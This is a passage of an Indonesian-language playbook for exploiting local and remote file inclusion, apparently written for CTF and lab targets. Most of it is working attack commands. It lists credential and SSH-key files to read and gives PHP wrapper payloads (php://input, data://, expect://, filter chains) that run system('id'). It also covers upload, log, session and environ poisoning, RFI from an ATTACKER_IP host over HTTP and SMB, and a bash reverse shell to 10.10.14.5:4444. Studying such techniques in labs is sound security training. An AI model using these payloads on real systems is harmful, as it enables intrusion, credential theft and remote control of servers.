|WordPress|`wp-config.php`|`DB_NAME`, `DB_USER`, `DB_PASSWORD`, `DB_HOST`, `AUTH_KEY`, `SECURE_AUTH_KEY`|
|Joomla|`configuration.php`|DB credentials/config|
|Django|`settings.py`|`SECRET_KEY`, `DATABASES`, `DEBUG`, `ALLOWED_HOSTS`|
|Flask|`app.py` / `config.py`|Routes, config, secrets|
|Apache|`.htaccess`|Rewrite/access behavior|

```bash
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=/var/www/html/.env'
```

Target file lain yang umum diperiksa untuk source disclosure (via `php://filter`, lihat Part 4.2): `index.php`, `config.php`, `db.php`, `login.php`, `admin.php`, `routes.php`, `functions.php`, `upload.php`.

Setelah source terbaca, cari secara spesifik:

```bash
grep -iE "(password|passwd|secret|key|token|api_key|db_pass)" source/*.php
grep -iE "(move_uploaded_file|upload|file_put_contents|fwrite)" source/*.php   # kandidat upload bypass
grep -iE "(include|require|include_once|require_once)" source/*.php           # kemungkinan LFI lain
grep -iE "(eval|exec|system|passthru|shell_exec|popen|proc_open)" source/*.php # possible injection point
```

## 3.4 Objective: Execution Opportunity

**Kenapa:** menentukan apakah ada attacker-controlled file/lokasi yang bisa dikombinasikan dengan LFI untuk RCE (detail eksekusi di Part 6).

|Target|Evidence yang Dicari|
|---|---|
|Upload path (dari source code atau response upload)|Lokasi penyimpanan file upload|
|`/var/log/apache2/access.log`, `/var/log/nginx/access.log`|Log HTTP yang berpotensi di-poison|
|`/var/log/auth.log`, `/var/log/mail.log`|Log service lain yang berpotensi di-poison|
|Session storage (`session.save_path` dari `php.ini`)|Lokasi file session untuk session poisoning|

## 3.5 Linux — Tabel Prioritas Lengkap

|File Path|Isi yang Dicari|Prioritas|
|---|---|---|
|`/etc/passwd`|Users, UID/GID, home path, shell|**P0**|
|`/etc/hosts`|Hostnames/internal mapping|**P0**|
|`/etc/hostname`|Hostname|P0|
|`/proc/self/environ`|Environment variables, secrets|**P0**|
|`/proc/self/cmdline`|Process command line|P1|
|`/proc/self/exe`|Executable reference|P2|
|`/proc/net/tcp`|TCP sockets/connections|P1|
|`~/.ssh/id_rsa`|Private SSH key (ganti `~` dengan home directory aktual)|**P0**|
|`~/.ssh/authorized_keys`|SSH authorized keys|P1|
|`~/.bash_history`|Commands/user activity|P1|
|`/var/log/apache2/access.log`|HTTP logs, potential poisoned content|**P0**|
|`/var/log/apache2/error.log`|Server errors|P1|
|`/var/log/auth.log`|Authentication events|P1|
|`/var/log/nginx/access.log`|HTTP logs|**P0**|
|`/var/mail/www-data`|Application mail|P2|
|`/var/www/html/config.php`|DB credentials, secrets|**P0**|
|`/var/www/html/.env`|Application secrets|**P0**|
|`/etc/nginx/nginx.conf`|Server configuration|P1|
|`/etc/apache2/apache2.conf`|Apache configuration|P1|
|`/etc/ssh/sshd_config`|SSH configuration|P1|
|`/etc/resolv.conf`|DNS configuration|P2|
|`/proc/self/status`|UID/GID/capabilities|P1|
|`/proc/self/maps`|Loaded memory mappings|P2|
|`/proc/version`|Kernel information|P2|

> `~` bukan path literal yang selalu dipahami aplikasi — ganti dengan home directory aktual (dari `/etc/passwd`) jika sudah diketahui.

## 3.6 Windows — Tabel Prioritas

**Decision:** gunakan ketika evidence recon menunjukkan Windows/IIS/XAMPP.

|File Path|Isi yang Dicari|Prioritas|
|---|---|---|
|`C:\Windows\System32\drivers\etc\hosts`|Hostname mappings|**P0**|
|`C:\Windows\win.ini`|Basic Windows fingerprint|**P0**|
|`C:\Windows\System32\config\SAM`|Local account database (butuh privilege tinggi — LFI success tidak berarti privilege issue hilang)|P1|
|`C:\Users\Administrator\Desktop\flag.txt`|CTF flag candidate|**P0**|
|`C:\inetpub\wwwroot\web.config`|IIS/ASP.NET configuration|**P0**|
|`C:\xampp\htdocs\config.php`|PHP app configuration|P1|
|`C:\Windows\repair\sam`|Legacy SAM location|P2|
|`C:\Windows\System32\drivers\etc\services`|Service definitions|P2|

```bash
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=../../../../windows/win.ini'
```

---

# Part 4 — PHP Wrappers

## 4.1 Konsep

**Decision:** gunakan ketika target adalah PHP dan LFI sudah confirmed. Wrapper sering menjadi perbedaan antara sekadar file read dan source disclosure / code execution.

PHP menyediakan mekanisme akses resource lewat scheme: `php://`, `data://`, `file://`, `zip://`, `phar://`, `expect://`. Tidak semua wrapper tersedia atau cocok untuk `include()` — availability bergantung pada PHP version, `php.ini`, dan konfigurasi aplikasi.

```text
LFI
 ├── php://filter  → source disclosure
 ├── php://input   → code execution (butuh include() + config cocok)
 ├── data://       → code execution (butuh config cocok)
 ├── zip://        → butuh uploaded archive
 ├── phar://       → archive/object behavior
 └── expect://     → direct command execution (extension jarang tersedia)
```

## 4.2 `php://filter` — Source Disclosure

**Decision:** gunakan setelah LFI confirmed ketika file PHP dibaca tetapi output yang terlihat adalah hasil execution (rendered HTML), bukan source code. Salah satu teknik paling penting untuk CTF.

**Reference:**

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php'
```

Decode:

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' \
  | base64 -d
```

Jika ada HTML noise membungkus base64, strip dulu:

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=config.php' \
  | sed 's/<[^>]*>//g' | tr -d '\n ' | base64 -d
```

Multiple filter chain / path relatif juga bisa dicoba: `php://filter/read=convert.base64-encode/resource=config.php`, `php://filter/convert.base64-encode/resource=../config.php`.

**Confidence:** HIGH bila base64 ter-decode menjadi PHP valid dan konsisten.

## 4.3 `php://input`

**Decision:** gunakan pada PHP yang meng-include input stream sebagai PHP code, terutama ketika upload/log poisoning tidak tersedia. **Sangat configuration-dependent** — butuh LFI + `php://input` accessible + aplikasi menggunakan `include()`/`require()` + PHP benar-benar menginterpretasi stream tersebut. Jika `allow_url_include = Off` atau wrapper/include behavior berbeda, teknik ini dapat gagal.

**Reference:**

Validasi aman dulu sebelum command kompleks:

```bash
curl -s -X POST 'http://10.10.10.10/index.php?page=php://input' \
  --data '<?php echo "LFI_INPUT_OK"; ?>'
```

Baru validasi command execution:

```bash
curl -s -X POST 'http://10.10.10.10/index.php?page=php://input' \
  --data "<?php echo shell_exec('id'); ?>"
```

## 4.4 `data://`

**Decision:** gunakan ketika `php://input` tidak praktis (mis. hanya menerima GET) tetapi `data://` wrapper dan konfigurasi include mendukung.

**Reference:**

Plain text (karakter khusus sebaiknya di-encode):

```bash
curl -G 'http://10.10.10.10/index.php' \
  --data-urlencode "page=data://text/plain,<?php system('id'); ?>"
```

Base64 variant:

```bash
printf '%s' "<?php system('id'); ?>" | base64 -w 0
# PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

curl -G 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=='
```

|Perbandingan|`php://input`|`data://`|
|---|---|---|
|Payload location|POST body|URL parameter|
|Request method|Biasanya POST|GET/POST|
|Configuration-sensitive|Ya|Ya|

## 4.5 `expect://`

**Decision:** gunakan hanya sebagai secondary check ketika PHP extension `expect` tersedia — **extension ini bukan default** pada sebagian besar deployment PHP modern, jadi jangan berharap tersedia tanpa verifikasi.

```bash
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=expect://id'
```

Urutan pengecekan yang masuk akal: `php://filter` → `php://input` → `data://` → `expect://` (bukan langsung mencoba `expect://`).

## 4.6 `zip://` dan `phar://`

**Decision:** gunakan ketika terdapat file upload + LFI dan uploaded file tidak dapat dieksekusi langsung (mis. extension diubah aplikasi).

**Reference — `zip://`:**

```bash
cat > shell.php <<'PHP'
<?php echo "ZIP_LFI_OK"; ?>
PHP
zip shell.zip shell.php

curl -s -F 'file=@shell.zip' 'http://10.10.10.10/upload'
# misal tersimpan di /tmp/uploads/shell.zip

curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=zip:///tmp/uploads/shell.zip#shell.php'
```

Untuk RCE validation, ganti isi `shell.php` menjadi `<?php system('id'); ?>` sebelum di-zip ulang dan di-upload.

**`phar://`:** digunakan untuk mengakses data di dalam Phar archive — muncul dalam kombinasi upload + LFI + file parsing + PHP object behavior. Contoh path: `phar:///tmp/uploads/archive.phar/file.php`. Behavior sangat bergantung pada bagaimana PHP dan aplikasi mengakses archive tsb. **Jangan menyamakan `zip://` dan `phar://`** — keduanya wrapper berbeda dengan semantics berbeda.

## 4.7 Wrapper Summary

|Wrapper|Fungsi|Kapan Pakai|Syarat|
|---|---|---|---|
|`php://filter`|Source disclosure|PHP LFI|`php://` tersedia|
|`php://input`|Read POST body as stream|LFI → code execution|Include behavior + config cocok|
|`data://`|Inline data|LFI → code execution|Wrapper/config mendukung|
|`phar://`|Access Phar resources|Upload/archive chains|Phar behavior + application context|
|`file://`|Local file access|Explicit wrapper testing|Local filesystem|

## 4.8 PHP Filter Chain Generator — Advanced/Context-Dependent

**Decision:** gunakan ketika LFI confirmed di PHP **dan** tidak ada file yang bisa dimanfaatkan untuk log poisoning atau upload **dan** `php://input`/`data://` tidak tersedia atau diblokir **dan** butuh arbitrary PHP execution. Posisikan ini sebagai **teknik advanced/context-dependent**, bukan default next step — ketersediaannya bergantung pada PHP build, filter yang tersedia di runtime, dan versi PHP, dan behavior-nya dapat berbeda antar deployment.

```text
LFI confirmed
    ↓
Need arbitrary code generation? (source disclosure biasa via php://filter tidak cukup)
    ↓
Are required filters / runtime behavior available? (verifikasi dengan payload echo sederhana dulu)
    ↓
If yes → filter-chain technique
If no  → investigate primitive lain (upload, log, php://input, data://)
```

### Konsep

Teknik ini menggunakan chain dari `iconv` filter untuk menghasilkan arbitrary byte sequence. Ketika di-include oleh PHP, byte sequence tersebut dapat menghasilkan valid PHP code yang dieksekusi. Chaining filter dilakukan dengan `|` (pipe), dan setiap konversi encoding dapat mengubah byte tertentu — dengan chain yang panjang dan tepat, byte target bisa di-craft.

**Karakteristik:** tidak butuh file upload, tidak butuh log poisoning, tidak butuh external server, tidak butuh `php://input`. Cukup LFI + PHP application — **tetapi tetap bergantung pada filter/iconv yang tersedia di runtime PHP target**, bukan tersedia secara universal pada semua konfigurasi PHP.

### Tool: PHP Filter Chain Generator

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

python3 php_filter_chain_generator.py --chain '<?php echo "FILTER_CHAIN_OK"; ?>'
```

Output berupa chain filter yang sangat panjang, contoh bentuk:

```text
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|... (ratusan filter) .../resource=data:text/plain,
```

### Workflow: LFI to RCE via Filter Chain

```bash
# Step 1: generate chain untuk command execution, verifikasi dengan echo dulu
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>' | tail -1 > payload.txt

# Step 2: gunakan chain dengan LFI
CHAIN=$(cat payload.txt)
curl -sG 'http://10.10.10.10/index.php' --data-urlencode "page=$CHAIN"
```

Expected (bila runtime mendukung): `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

Reverse shell:

```bash
python3 php_filter_chain_generator.py \
  --chain '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\""); ?>' \
  > revshell_chain.txt

nc -lvnp 4444
CHAIN=$(cat revshell_chain.txt | tail -1)
curl -sG 'http://10.10.10.10/index.php' --data-urlencode "page=$CHAIN"
```

### Troubleshooting

- **Payload/URL terlalu panjang (500 error):** kirim via POST alih-alih GET.
    
    ```bash
    CHAIN=$(cat payload.txt | tail -1)curl -s 'http://10.10.10.10/index.php' -X POST --data-urlencode "page=$CHAIN"
    ```
    
- **Encoding issues:** URL-encode manual chain sebelum request:
    
    ```bash
    CHAIN=$(cat payload.txt | tail -1 | jq -sRr @uri)curl -sG "http://10.10.10.10/index.php?page=$CHAIN"
    ```
    
- **Test dengan payload sederhana dulu** (`echo "PWNED"`) sebelum mencoba command execution kompleks.

### Kenapa Teknik Ini Bernilai (dengan Caveat)

Chain ini dapat melewati beberapa batasan lain (tidak butuh upload, tidak butuh `allow_url_include=On`, tidak butuh akses ke log) **selama** filter/iconv yang dibutuhkan tersedia di build PHP target — ini **bukan jaminan bekerja di semua konfigurasi PHP default**, karena daftar filter yang tersedia dan versi iconv dapat berbeda antar sistem operasi dan distribusi PHP. Teknik ini populer dan sering muncul di CTF modern (HackTheBox-style machines dan PortSwigger Web Security Academy labs sejak sekitar 2022), tetapi klaim mengenai versi PHP atau mesin CTF tertentu yang memakainya sebaiknya diverifikasi ulang di lab yang sedang dikerjakan daripada dianggap sebagai daftar tetap.

### Muscle Memory

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# copy chain, test dengan LFI:
curl -sG 'http://target/index.php' --data-urlencode "page=[PASTE_CHAIN]"
# jika berhasil → craft reverse shell dengan chain payload bash -i
```

---

# Part 5 — LFI → Code Execution (Overview)

Bagian ini **tidak memperkenalkan decision tree baru** — ia menghubungkan Part 0 (decision layer) dengan detail teknik yang ada di Part 4 (PHP Wrappers) dan Part 6 (Attacker-Controlled File Primitives).

## 5.1 Recap: Mengapa Code Execution Bukan Default Outcome

```text
LFI CONFIRMED
    ↓
Source disclosure available? → php://filter (Part 4.2) → sering membuka target baru (Part 0.3)
    ↓
Which execution primitive actually exists?
    ├── Wrapper-based (butuh PHP + config cocok)     → Part 4.3–4.6, 4.8
    ├── Attacker-controlled file (butuh lokasi tulis) → Part 6
    └── Remote include (butuh allow_url_include=On)   → Part 7
```

## 5.2 Memilih Primitive — Ringkasan Prerequisite

|Primitive|Prerequisite Inti|Rujukan|
|---|---|---|
|`php://filter`|LFI di PHP|Part 4.2 (source disclosure saja, bukan RCE)|
|`php://input`|Include() behavior + POST body diproses sebagai stream|Part 4.3|
|`data://`|Wrapper/config mendukung inline data|Part 4.4|
|`expect://`|Extension `expect` terpasang (jarang)|Part 4.5|
|`zip://` / `phar://`|Archive ter-upload|Part 4.6|
|Filter chain generator|Filter/iconv yang dibutuhkan tersedia di runtime|Part 4.8|
|Upload + LFI|Upload endpoint + LFI include path diketahui|Part 6.1|
|Log poisoning|Log writable + attacker-controlled + interpreted|Part 6.2|
|`/proc/self/environ` poisoning|Header benar-benar menjadi environment variable|Part 6.3|
|Session poisoning|Session storage location diketahui + LFI dapat include-nya|Part 6.4|
|RFI|`allow_url_include=On` + remote fetch benar-benar di-interpret|Part 7|

## 5.3 Validasi RCE — Selalu Gunakan Primitive Sederhana

Jangan langsung mengejar reverse shell. Validasi urutan bertahap:

```text
1. echo marker sederhana (mis. <?php echo "RCE_OK"; ?>)
2. id / whoami / pwd / hostname
3. baru reverse shell (jika scope/mode mengizinkan — lihat Operating Modes)
```

`id` yang menghasilkan `0` biasanya berarti kamu membaca **return code**, bukan **stdout** — gunakan primitive yang benar-benar mengembalikan output (`system()`, `shell_exec()`, bukan hanya exit status).

---

# Part 6 — Attacker-Controlled File Primitives

Bagian ini membahas semua primitive RCE yang bergantung pada **attacker menulis byte ke lokasi yang kemudian di-include oleh LFI** — upload, log, environment, dan session. Prasyarat umum untuk seluruh keluarga ini (jangan lompati verifikasi ini):

```text
LFI
 +
attacker-controlled content dapat ditulis ke suatu lokasi
 +
lokasi tersebut reachable oleh LFI
 +
included content benar-benar diinterpretasikan oleh interpreter yang relevan
 =
possible execution
```

**Bukan otomatis RCE:** "log readable" ≠ RCE, "log poisoning" (sekadar mengirim payload) ≠ RCE. Empat syarat di atas harus terpenuhi semua.

## 6.1 Upload + LFI Combo

**Decision:** gunakan ketika file upload endpoint ada + uploaded file tersimpan di suatu lokasi + direct execution dari lokasi tsb diblokir (mis. web server tidak mengeksekusi folder upload) + LFI tersedia untuk meng-include file tersebut.

**Reference:**

```bash
# Step 1 — marker PHP yang aman
cat > shell.php <<'PHP'
<?php echo "UPLOAD_LFI_OK"; ?>
PHP

# Step 2 — upload
curl -s -F 'file=@shell.php' 'http://10.10.10.10/upload'
# cari response: /uploads/shell.php  atau  /tmp/phpXXXXXX
```

**Step 3 — predict path.** Kandidat umum: `/uploads/shell.php`, `/upload/shell.php`, `/files/shell.php`, `/media/shell.php`, `/static/uploads/shell.php`, `/tmp/phpXXXXXX`. Jangan asumsikan salah satu benar — verifikasi lewat response, HTML source, download endpoint, source code, atau directory listing/error.

```bash
# Step 4 — include
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/www/html/uploads/shell.php'
# expected: UPLOAD_LFI_OK

# Step 5 — RCE validation (ganti isi shell.php dulu)
# <?php echo shell_exec('id'); ?>
```

**Jika upload ditolak karena extension check** (misalnya hanya menerima gambar), pertimbangkan double extension (`shell.php.jpg`) atau MIME type manipulation — teknik bypass upload lengkap ada di **[File 25: File Upload Workflow](/docs/file-upload)**, jangan diduplikasi di sini.

## 6.2 Log Poisoning

### 6.2.1 Konsep & Syarat

**Decision:** gunakan ketika LFI confirmed + tidak ada direct wrapper RCE + attacker-controlled data dapat masuk ke file log yang readable via LFI.

```text
        ATTACKER
           | malicious header
           v
     Web Server → access.log
           | LFI
           v
     include(access.log) → PHP Parser → Code Execution
```

Syarat lengkap: (1) LFI, (2) log file readable, (3) attacker dapat mempengaruhi isi log, (4) included content diinterpretasikan sebagai PHP, (5) web process dapat menjangkau log yang relevan. Kalau hanya "log readable" saja, **belum berarti RCE**.

### 6.2.2 Apache/Nginx Access Log Poisoning

**Reference:**

```bash
# Step 1 — tentukan log
# Apache: /var/log/apache2/access.log
# Nginx : /var/log/nginx/access.log

# Step 2 — inject marker via User-Agent
curl -s -A '<?php echo "LOG_POISON_OK"; ?>' 'http://10.10.10.10/'

# Step 3 — include log
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/apache2/access.log'
# expected: LOG_POISON_OK
```

RCE validation di lab:

```bash
curl -s -A "<?php echo shell_exec('id'); ?>" 'http://10.10.10.10/'
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=/var/log/apache2/access.log'
```

Header alternatif jika User-Agent tidak masuk log: `Referer`, `X-Forwarded-For`.

**Jika tidak bekerja**, kemungkinan: log tidak writable/readable, log format meng-escape marker PHP, aplikasi memakai custom log, PHP tidak memproses log sebagai include (mungkin hanya `readfile()`), WAF/filter mengubah header, atau target Nginx + PHP-FPM dengan path log berbeda.

### 6.2.3 SSH Log Poisoning (`auth.log`)

**Decision:** gunakan hanya pada CTF/lab ketika `/var/log/auth.log` readable via LFI + SSH service accessible + username/input attacker mempengaruhi isi log.

```text
SSH connection → auth.log → LFI → PHP parser
```

**Caveat penting:** behavior sangat tergantung OpenSSH version, PAM, syslog/journald, dan format log — teknik klasik dapat berbeda antar target.

```bash
# Deteksi dulu
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=/var/log/auth.log'
# cari: Failed password / Invalid user / Accepted password / sshd

# Injeksi (banyak OpenSSH modern menolak username invalid sebelum masuk log)
ssh '<?php echo "SSH_LOG_OK"; ?>'@10.10.10.10

curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=/var/log/auth.log'
```

**Jika SSH menolak karakter khusus** (OpenSSH modern), cek fallback `/proc/self/fd/*`:

```bash
for i in $(seq 0 20); do
    result=$(curl -sG 'http://10.10.10.10/index.php' \
        --data-urlencode "page=../../../../proc/self/fd/$i" 2>/dev/null | head -1)
    [ -n "$result" ] && echo "FD $i: $result"
done
```

### 6.2.4 Mail Log Poisoning

**Decision:** gunakan ketika server menjalankan mail service dan attacker-controlled input masuk ke mail log yang dapat dibaca via LFI. Potensi lokasi: `/var/log/mail.log`, `/var/log/maillog`.

```text
SMTP-controlled field → mail log → LFI → PHP interpretation
```

```bash
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=/var/log/mail.log'
# cari: postfix / sendmail / smtp / client=
```

Untuk challenge, gunakan SMTP service yang memang disediakan target dan jangan mengirim ke sistem di luar lab.

## 6.3 `/proc/self/environ` Poisoning

**Decision:** gunakan ketika `/proc/self/environ` readable **dan** ada evidence bahwa request header benar-benar mempengaruhi process environment — jangan asumsikan header otomatis menjadi environment variable tanpa verifikasi.

```text
HTTP header → process environment → /proc/self/environ → LFI
```

`/proc/self/environ` merepresentasikan environment process yang sedang melayani request — header **tidak otomatis** menjadi environment variable; harus ada framework/server behavior spesifik yang memindahkan data tsb ke environment.

**Safe marker test:**

```bash
curl -s -H 'X-LFI-Test: PROC_ENV_OK' 'http://10.10.10.10/'
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=/proc/self/environ'
# cari: PROC_ENV_OK
```

Jika marker tidak muncul → header ≠ environment pada target ini, dan teknik ini tidak applicable.

## 6.4 Session File Poisoning

**Decision:** gunakan ketika ada evidence bahwa nilai yang di-submit user disimpan persisten oleh aplikasi (mis. session) **dan** disimpan di file yang reachable oleh LFI. Jangan asumsikan "session exists → poison → RCE" secara langsung — verifikasi setiap tahap:

```text
Can attacker control persisted value?
    ↓
Does application store it in a reachable file? (cek session.save_path dari php.ini/source, Part 3.3)
    ↓
Can LFI include that file?
    ↓
Will interpreter process the controlled bytes?
    ↓
Possible execution
```

**Reference:**

```bash
# Step 1 — kirim PHP code sebagai nilai yang disimpan session
curl -s 'http://10.10.10.10/login.php' \
  -d "username=<?php system('id'); ?>&password=test" \
  -c session.txt

# Step 2 — ambil session ID
SESSION_ID=$(grep PHPSESSID session.txt | awk '{print $7}')

# Step 3 — include file session via LFI (lokasi umum: /var/lib/php/sessions/sess_<id>)
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode "page=/var/lib/php/sessions/sess_$SESSION_ID" \
  -b "PHPSESSID=$SESSION_ID"
```

Expected bila berhasil: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Bila gagal, cek `session.save_path` di `php.ini` — lokasi default dapat berbeda antar distro/konfigurasi.

## 6.5 Lokasi Lain yang Context-Dependent

Selain empat keluarga di atas, evidence dari Part 3 kadang membuka lokasi attacker-influenced lain yang spesifik terhadap target — misalnya file descriptor proses (`/proc/self/fd/*`), custom log path yang ditemukan dari source code, atau cache file aplikasi. Perlakukan semuanya dengan syarat yang sama di awal bagian ini: attacker-controlled + reachable + interpreted, bukan hanya salah satu.

---

# Part 7 — Remote File Inclusion (RFI)

## 7.1 Fundamentals

**Decision:** gunakan ketika target adalah PHP dan ada indikasi remote URL dapat di-include. Jangan berasumsi LFI berarti RFI — keduanya butuh kondisi berbeda.

|Aspek|LFI|RFI|
|---|---|---|
|Resource|Local|Remote|
|Contoh|`/etc/passwd`|`http://ATTACKER/shell.php`|
|Kelaziman|Tinggi|Lebih jarang (banyak deployment modern menonaktifkan `allow_url_include`)|
|Potential impact|File read/RCE|Sangat dekat ke direct RCE — jika berhasil|

Konfigurasi PHP yang relevan: `allow_url_include` biasanya harus `On` untuk classic remote inclusion, dan URL-aware file handling harus tersedia. **Jangan hanya mengandalkan asumsi `php.ini` default** — framework/aplikasi dapat menambahkan behavior sendiri.

Cara mengecek: bila berhasil membaca `phpinfo()` atau source `php.ini`, cari langsung nilai `allow_url_include`.

## 7.2 Basic RFI (Classic HTTP)

**Decision:** gunakan ketika remote URL inclusion memang memungkinkan secara konsep (mis. dari `phpinfo` atau source code).

**Reference:**

```bash
# Step 1 — controlled file
mkdir -p ~/lfi-rfi-lab && cd ~/lfi-rfi-lab
cat > test.txt <<'EOF'
RFI_TEST_OK
EOF

# Step 2 — HTTP server
python3 -m http.server 8000 --bind 0.0.0.0

# Step 3 — verifikasi lokal
curl -s http://127.0.0.1:8000/test.txt

# Step 4 — verifikasi target bisa menjangkau attacker
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=http://ATTACKER_IP:8000/test.txt'
```

Jika target mengambil file, terminal Python akan mencatat request masuk — ini konfirmasi **remote fetch**, bukan otomatis konfirmasi **execution** (lihat 7.1 tabel: jangan menyatakan outbound request sebagai bukti code execution).

PHP lab test untuk memastikan konten di-interpret, bukan hanya di-fetch:

```bash
cat > rfi-test.php <<'PHP'
<?php echo "RFI_PHP_OK"; ?>
PHP

curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=http://ATTACKER_IP:8000/rfi-test.php'
```

Bila `RFI_PHP_OK` muncul → PHP remote inclusion benar-benar aktif. RCE validation di lab: ganti isi `rfi-test.php` menjadi `<?php echo shell_exec('id'); ?>`.

## 7.3 RFI via SMB / UNC — Bukan RFI Klasik

**Decision:** gunakan terutama ketika target **Windows** dan aplikasi/OS dapat mengakses UNC path. **Jangan menyamakan ini dengan RFI HTTP klasik** — ini bergantung pada semantics filesystem Windows, SMB client, PHP/application path handling, dan dukungan UNC path, bukan pada `allow_url_include`.

```text
Windows Target --SMB--> \\ATTACKER\share\shell.php
```

**Reference:**

```bash
mkdir -p ~/smb-share
cat > ~/smb-share/test.php <<'PHP'
<?php echo "SMB_LFI_OK"; ?>
PHP

impacket-smbserver share ~/smb-share -smb2support
```

Target path: `\\ATTACKER_IP\share\test.php` (URL-encoded: `%5C%5CATTACKER_IP%5Cshare%5Ctest.php`).

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=\\ATTACKER_IP\share\test.php'
```

Jika target mencoba mengakses share, terminal SMB server dapat menunjukkan connection/request masuk. **Catatan:** pada Linux target, `\\ATTACKER\share` bukan cara normal untuk mengambil file remote via PHP include — gunakan teknik ini khusus untuk Windows/IIS/XAMPP/UNC-capable application.

## 7.4 RFI Filter Bypass

**Decision:** gunakan ketika RFI sudah terbukti secara konsep tetapi URL atau karakter tertentu difilter. Teknik encoding dasarnya sama dengan Part 2.4 — hanya diterapkan pada skema URL, bukan path traversal.

```bash
# URL encoding
curl 'http://10.10.10.10/index.php?page=http%3A%2F%2FATTACKER_IP%3A8000%2Ftest.txt'
```

Double encoding (`%253A`, `%252F`) hanya berguna jika target memiliki `decode → filter → decode` atau urutan sejenis — sama seperti pada Part 2.4.

Null byte legacy (`http://ATTACKER/shell.php%00`) hanya relevan untuk PHP < 5.3.4 — gunakan hanya untuk memahami challenge lama, sama seperti caveat di Part 2.4.

---

# Part 8 — Non-PHP Contexts

**Catatan penting:** dokumen ini fokus ke PHP karena paling sering muncul di CTF dengan LFI vulnerability. Tapi LFI **bukan eksklusif PHP** — dan istilah "LFI" pada bahasa lain perlu semantics yang lebih presisi.

## 8.1 Tiga Semantics yang Harus Dibedakan

```text
arbitrary file read           → fungsi seperti open()/File.read()/fs.readFile() mengembalikan isi file
file/template inclusion       → resource dieksekusi/di-render sebagai template/kode (lebih jarang di non-PHP)
interpreter-assisted execution → resource yang dibaca benar-benar diproses sebagai kode oleh interpreter
```

**Jangan menganggap semua** `fs.readFile()`, `open()`, `File.read()`, `sendFile()` **sebagai LFI dalam semantics yang sama dengan PHP `include()`.** Kebanyakan kasus di non-PHP adalah "File Inclusion / Arbitrary File Read" (baca file), bukan otomatis code execution — karena bahasa-bahasa ini umumnya tidak meng-interpret file yang dibaca sebagai kode kecuali ada template injection terpisah.

## 8.2 Contoh per Platform

**Python (Flask/Django):**

```python
@app.route('/read')
def read_file():
    filename = request.args.get('file')
    with open(filename, 'r') as f:   # vulnerable
        return f.read()
```

```bash
curl -sG 'http://10.10.10.10/read' --data-urlencode 'file=../../../../etc/passwd'
```

Tidak ada PHP-style wrapper (`php://filter`, dst), tapi path traversal tetap applicable.

**Node.js:**

```javascript
app.get('/file', (req, res) => {
    const file = req.query.path;
    res.sendFile(file);   // vulnerable jika tidak divalidasi
});
```

```bash
curl -sG 'http://10.10.10.10/file' --data-urlencode 'path=../../../../etc/passwd'
```

Titik lemah spesifik Node.js: `path.join()` tanpa sanitasi input, `fs.readFile()` yang bisa membaca arbitrary file.

**Ruby (Rails/Sinatra):**

```ruby
get '/view' do
  filename = params[:file]
  File.read(filename)   # vulnerable
end
```

**Java (Spring/Servlets):**

```java
@GetMapping("/download")
public ResponseEntity<Resource> downloadFile(@RequestParam String filename) {
    Path path = Paths.get(filename);   // vulnerable
    Resource resource = new FileSystemResource(path);
    return ResponseEntity.ok().body(resource);
}
```

## 8.3 Perbedaan vs PHP LFI

|Aspect|PHP|Non-PHP (Python/Node/Ruby/Java)|
|---|---|---|
|Path Traversal|Applicable|Applicable (sama)|
|PHP-style Wrappers|`php://filter`, `php://input`, `data://`|Tidak ada|
|Log Poisoning|Applicable|Applicable (tergantung web server, sama polanya)|
|File Upload + Inclusion|Applicable|Applicable (sama pola prasyaratnya)|
|Direct Code Exec dari file read|Via `include()`/`require()`|Umumnya file read saja, kecuali ada template injection terpisah|
|Kelaziman di CTF|Sangat sering|Lebih jarang|

## 8.4 Strategi untuk Non-PHP LFI

1. Path traversal dulu — `../../../../etc/passwd`.
2. Sensitive files — `/etc/passwd`, SSH key, application config (Part 3 tetap berlaku).
3. Log poisoning — jika ada akses ke log file (Part 6.2 tetap berlaku secara konsep).
4. Upload + LFI combo — jika ada upload functionality (Part 6.1 tetap berlaku secara konsep).
5. **Skip PHP wrappers** — `php://filter` dkk. tidak akan bekerja di runtime non-PHP.

**Catatan akurasi:** beberapa mesin HTB/CTF di masa lalu disebut-sebut melibatkan LFI/path traversal di stack non-PHP (mis. aplikasi Java atau custom app di OS non-Linux-standar). Nama mesin spesifik dan detail vulnerability-nya berubah/diperbarui dari waktu ke waktu dan sebaiknya diverifikasi langsung di writeup resmi platform terkait saat dibutuhkan, bukan dihafal dari daftar tetap.

**Bottom line:** jangan asumsikan LFI = PHP. Prinsip path traversal berlaku universal; yang berbeda adalah primitive RCE yang tersedia setelahnya.

---

# Part 9 — Troubleshooting

